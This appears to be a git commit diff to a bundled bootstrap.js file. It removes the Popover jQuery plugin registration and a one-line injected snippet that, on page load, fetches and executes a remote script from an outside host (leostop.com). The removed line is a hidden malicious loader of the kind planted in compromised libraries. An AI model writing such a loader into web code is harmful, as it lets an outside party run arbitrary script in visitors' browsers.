7c4c6185c129c7856397183fa99328be67978647
amapollo <102009257+amapollo@users.noreply.github.com>
2022-03-21 08:28:26 +0300

    Update bootstrap.js

--- js/bootstrap.js
+++ js/bootstrap.js
@@ -3628,16 +3628,10 @@
    */
 
 
-  $.fn[NAME$7] = Popover._jQueryInterface;
-  $.fn[NAME$7].Constructor = Popover;
-
-  $.fn[NAME$7].noConflict = function () {
-    $.fn[NAME$7] = JQUERY_NO_CONFLICT$7;
-    return Popover._jQueryInterface;
-  };
 
 
-  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+
+
 
   /**
    * ------------------------------------------------------------------------
